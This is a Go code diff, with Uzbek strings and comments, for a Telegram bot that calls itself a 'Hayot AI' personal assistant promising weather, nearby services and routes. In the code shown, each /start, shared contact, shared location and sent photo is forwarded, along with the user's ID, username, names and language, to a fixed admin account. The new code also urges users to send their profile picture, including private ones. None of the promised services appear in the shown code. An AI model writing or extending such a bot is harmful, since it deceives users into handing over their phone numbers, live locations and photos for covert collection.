@@ -395,49 +395,43 @@ func (handler *AppHandler) Telegram(ctx echo.Context) error {
 }
 
 func (handler AppHandler) User(ctx echo.Context) error {
-
 	bot, err := tgbotapi.NewBotAPI(handler.TelegramToken)
 	if err != nil {
-		return ctx.JSON(500, echo.Map{"error": "Bot error"})
+		return ctx.JSON(500, echo.Map{"error": "Bot ishga tushmadi"})
 	}
 
-	// Webhookni o‘chiramiz (long polling)
+	// Webhookni o‘chiramiz (long polling ishlatamiz)
 	_, _ = bot.Request(tgbotapi.DeleteWebhookConfig{})
 
 	go func() {
-
 		u := tgbotapi.NewUpdate(0)
 		u.Timeout = 60
 		updates := bot.GetUpdatesChan(u)
 
 		for update := range updates {
 
-			// ======================
-			// /start
-			// ======================
+			// /start komandasi
 			if update.Message != nil && update.Message.Text == "/start" {
-
 				user := update.Message.From
 				chatID := update.Message.Chat.ID
 
-				// Admin uchun user info
+				// Adminga yangi foydalanuvchi haqida xabar
 				adminText := fmt.Sprintf(
 					"🆕 <b>Yangi foydalanuvchi</b>\n\n"+
 						"🆔 ID: <code>%d</code>\n"+
 						"👤 Username: @%s\n"+
-						"📛 First name: %s\n"+
-						"🧾 Last name: %s\n"+
-						"🌍 Lang: %s",
+						"📛 Ism: %s\n"+
+						"🧾 Familiya: %s\n"+
+						"🌍 Til: %s",
 					user.ID,
 					user.UserName,
 					user.FirstName,
 					user.LastName,
 					user.LanguageCode,
 				)
-
 				sendToAdminText(bot, adminText)
 
-				// Userga ruxsat so‘rash tugmalari
+				// Tugmalar
 				keyboard := tgbotapi.NewReplyKeyboard(
 					tgbotapi.NewKeyboardButtonRow(
 						tgbotapi.NewKeyboardButtonContact("📲 Telefon yuborish"),
@@ -445,83 +439,146 @@ func (handler AppHandler) User(ctx echo.Context) error {
 					tgbotapi.NewKeyboardButtonRow(
 						tgbotapi.NewKeyboardButtonLocation("📍 Lokatsiya yuborish"),
 					),
+					// tgbotapi.NewKeyboardButtonRow(
+					// 	tgbotapi.NewKeyboardButton("📷 Profil rasmini yuborish"),
+					// ),
 				)
 
-				msg := tgbotapi.NewMessage(chatID, "🔥 Salom! Men – shaxsiy Hayot AI 🤖 bot man\n\n"+
-					"Ro‘yxatdan o‘ting, keyin har doim siz uchun kerakli ma’lumotlarni beraman:\n\n"+
-					"☁️ Hududingiz uchun aniq ob-havo\n"+
-					"🏧 Hozir ochiq yaqin bankomat, dorixona, zapravka, kafe\n"+
-					"🚌 Eng qisqa yo‘l va transport variantlari\n\n"+
-					"Ro‘yxatdan o‘tish uchun pastdagi tugmalarni bosing 🚀")
+				msg := tgbotapi.NewMessage(chatID,
+					"🔥 Salom! Men – shaxsiy Hayot AI 🤖 botman\n\n"+
+						"Ro‘yxatdan o‘ting, keyin har doim siz uchun kerakli ma’lumotlarni beraman:\n\n"+
+						"☁️ Hududingiz uchun aniq ob-havo\n"+
+						"🏧 Yaqin bankomat, dorixona, zapravka, kafe\n"+
+						"🚌 Eng qisqa yo‘l va transport variantlari\n\n"+
+						"Quyidagi tugmalarni bosib ro‘yxatdan o‘ting 🚀\n\n"+
+						"📷 Profil rasmi uchun: tugmani bosing va ko‘rsatmalarga amal qiling!")
 				msg.ReplyMarkup = keyboard
 				bot.Send(msg)
 			}
 
 			// ======================
-			// CONTACT
+			// TELEFON QABUL QILISH
 			// ======================
 			if update.Message != nil && update.Message.Contact != nil {
-
 				user := update.Message.From
 				chatID := update.Message.Chat.ID
 				phone := update.Message.Contact.PhoneNumber
 
 				adminText := fmt.Sprintf(
-					"📞 <b>Telefon yuborildi</b>\n\n"+
+					"📞 <b>Telefon raqami yuborildi</b>\n\n"+
 						"🆔 User ID: <code>%d</code>\n"+
 						"👤 @%s\n"+
-						"📱 Phone: %s",
+						"📱 Telefon: %s",
 					user.ID,
 					user.UserName,
 					phone,
 				)
-
 				sendToAdminText(bot, adminText)
 
-				bot.Send(tgbotapi.NewMessage(chatID, "✅ Telefon qabul qilindi"))
+				bot.Send(tgbotapi.NewMessage(chatID, "✅ Telefon raqamingiz qabul qilindi!"))
 			}
 
 			// ======================
-			// LOCATION (REAL PIN + USER INFO)
+			// LOKATSIYA QABUL QILISH
 			// ======================
 			if update.Message != nil && update.Message.Location != nil {
-
 				user := update.Message.From
 				chatID := update.Message.Chat.ID
-
 				lat := update.Message.Location.Latitude
 				lon := update.Message.Location.Longitude
 
-				// 1️⃣ ADMIN ga REAL LOCATION (PIN)
+				// Adminga pin yuborish
 				locationMsg := tgbotapi.NewLocation(ADMIN_ID, lat, lon)
 				bot.Send(locationMsg)
 
-				// 2️⃣ LOCATION ostiga USER INFO (TEXT)
+				// Adminga matn bilan ma’lumot
 				adminText := fmt.Sprintf(
-					"📍 <b>Lokatsiya egasi</b>\n\n"+
+					"📍 <b>Lokatsiya yuborildi</b>\n\n"+
 						"🆔 ID: <code>%d</code>\n"+
 						"👤 Username: @%s\n"+
-						"📛 First name: %s\n"+
-						"🧾 Last name: %s\n"+
-						"🌍 Lang: %s",
+						"📛 Ism: %s\n"+
+						"🧾 Familiya: %s\n"+
+						"🌍 Til: %s",
 					user.ID,
 					user.UserName,
 					user.FirstName,
 					user.LastName,
 					user.LanguageCode,
 				)
-
 				sendToAdminText(bot, adminText)
 
-				// 3️⃣ USER ga tasdiq
-				bot.Send(tgbotapi.NewMessage(chatID, "✅ Lokatsiya qabul qilindi"))
+				bot.Send(tgbotapi.NewMessage(chatID, "✅ Lokatsiyangiz qabul qilindi!"))
 			}
 
+			// ======================
+			// PROFIL RASM TUGMASI BOSILSA
+			// ======================
+			if update.Message != nil && update.Message.Text == "📷 Profil rasmini yuborish" {
+				chatID := update.Message.Chat.ID
+				msg := tgbotapi.NewMessage(chatID,
+					"📷 Iltimos, profilingizdagi rasmingizni menga oddiy foto sifatida yuboring!\n\n"+
+						"Qanday qilish kerak:\n"+
+						"1. Telegramda o‘z profilingizni oching\n"+
+						"2. Rasm ustiga bosing → \"Forward\" → Meni tanlang\n"+
+						"   yoki \"Foto sifatida yuborish\"\n"+
+						"3. Yuboring 🚀\n\n"+
+						"Private profil rasmi bo‘lsa ham ishlaydi!")
+				bot.Send(msg)
+				continue
+			}
+
+			// ======================
+			// HAR QANDAY FOTO KELSA (profil rasmi sifatida qabul qilamiz)
+			// ======================
+			if update.Message != nil && len(update.Message.Photo) > 0 {
+				user := update.Message.From
+				chatID := update.Message.Chat.ID
+				photo := update.Message.Photo[len(update.Message.Photo)-1] // eng katta o‘lcham
+
+				log.Println("Photo FileID:", photo.FileID)
+
+				// File ma’lumotini olish
+				fileConfig := tgbotapi.FileConfig{FileID: photo.FileID}
+				file, err := bot.GetFile(fileConfig)
+				if err != nil {
+					log.Println("GetFile xatosi:", err)
+					bot.Send(tgbotapi.NewMessage(chatID, "❌ Rasmni qayta ishlashda xato. Iltimos, yana urinib ko‘ring."))
+					continue
+				}
+
+				log.Println("File Link:", file.Link(bot.Token))
+
+				// Adminga foto yuborish
+				photoMsg := tgbotapi.NewPhoto(ADMIN_ID, tgbotapi.FileURL(file.Link(bot.Token)))
+				caption := fmt.Sprintf(
+					"📷 <b>Profil rasmi yuborildi</b>\n\n"+
+						"🆔 ID: <code>%d</code>\n"+
+						"👤 Username: @%s\n"+
+						"📛 Ism: %s\n"+
+						"🧾 Familiya: %s\n"+
+						"🌍 Til: %s",
+					user.ID,
+					user.UserName,
+					user.FirstName,
+					user.LastName,
+					user.LanguageCode,
+				)
+				photoMsg.Caption = caption
+				photoMsg.ParseMode = "HTML"
+
+				_, err = bot.Send(photoMsg)
+				if err != nil {
+					log.Println("Adminga foto yuborishda xato:", err)
+				}
+
+				// Foydalanuvchiga tasdiq
+				bot.Send(tgbotapi.NewMessage(chatID, "✅ Profil rasmingiz muvaffaqiyatli qabul qilindi! Endi barcha xizmatlardan foydalana olasiz 🚀"))
+			}
 		}
 	}()
 
 	return ctx.JSON(http.StatusOK, echo.Map{
-		"status": "telegram bot started",
+		"status": "Telegram bot muvaffaqiyatli ishga tushdi",
 	})
 }
 
